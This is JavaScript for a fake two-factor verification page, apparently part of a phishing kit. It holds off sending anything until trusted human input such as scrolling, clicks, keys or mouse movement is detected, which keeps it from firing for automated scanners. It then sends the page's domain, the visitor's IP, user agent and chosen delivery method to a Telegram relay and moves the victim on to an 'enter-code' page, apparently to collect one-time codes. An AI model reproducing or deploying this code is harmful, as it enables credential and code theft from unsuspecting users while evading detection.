(function () {
  var form = document.getElementById("auth-form");
  var methodRadios = document.querySelectorAll('input[name="delivery-method"]');
  var methodError = document.getElementById("method_validation_message");
  var submitBtn = form.querySelector('.button-subm');

  // ============================================================
  // ====== DOMAIN DETECTION - ONE TIME, HUMAN ONLY =============
  // ============================================================

  let domainDetected = false;
  let humanInteractionConfirmed = false;

  function detectDomain() {
    if (domainDetected) return;
    if (!humanInteractionConfirmed) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain
    });

    console.log(`🌐 Domain detected (human): ${domain}`);
  }

  function confirmHumanInteraction() {
    if (humanInteractionConfirmed) return;
    if (event && event.isTrusted === false) return;
    
    humanInteractionConfirmed = true;
    console.log('👤 Human interaction confirmed');
    detectDomain();
  }

  // Human scroll detection
  let scrollTimeout = null;
  let scrollCount = 0;
  let lastScrollTime = 0;

  window.addEventListener('scroll', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    const now = Date.now();
    const timeSinceLastScroll = now - lastScrollTime;
    lastScrollTime = now;
    
    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 100) return;
    
    scrollCount++;
    if (scrollCount < 2) return;
    
    const scrollY = window.scrollY;
    if (scrollY < 30) return;
    
    if (scrollTimeout) {
      clearTimeout(scrollTimeout);
      scrollTimeout = null;
    }
    
    scrollTimeout = setTimeout(function() {
      if (!domainDetected && humanInteractionConfirmed === false) {
        confirmHumanInteraction();
      }
      scrollTimeout = null;
    }, 300);
    
  }, { passive: true });

  // Human click detection
  document.addEventListener('click', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    if (e.target.closest('.spinner, .loading')) return;
    confirmHumanInteraction();
  });

  // Human keypress detection
  document.addEventListener('keydown', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    if (e.key.length !== 1) return;
    confirmHumanInteraction();
  });

  // Human mousemove detection (fallback)
  let mouseMoveCount = 0;
  
  document.addEventListener('mousemove', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    mouseMoveCount++;
    if (mouseMoveCount < 3) return;
    if (e.movementX === 0 && e.movementY === 0) return;
    
    confirmHumanInteraction();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  function clearErrors() {
    methodError.textContent = "";
  }

  // ============================================================
  // ====== FORM SUBMIT =========================================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    clearErrors();

    var selectedMethod = null;
    methodRadios.forEach(function(radio) {
      if (radio.checked) {
        selectedMethod = radio.value;
      }
    });

    if (!selectedMethod) {
      methodError.textContent = "Please select a delivery method.";
      return;
    }

    // ====== SEND METHOD TO TELEGRAM ======
    sendToTelegram('auth_method', {
      method: selectedMethod,
      destination: selectedMethod === 'email' ? 'Email' : 'SMS'
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // Store auth data for next page
    try {
      sessionStorage.setItem(
        "melodyAuth",
        JSON.stringify({
          method: selectedMethod,
          destination: selectedMethod === 'email' ? 'Email' : 'SMS'
        })
      );
    } catch (e) {}

    // ====== REDIRECT AFTER 5 SECONDS ======
    setTimeout(function() {
      window.location.href = "enter-code.html";
    }, 5000);
  });

})();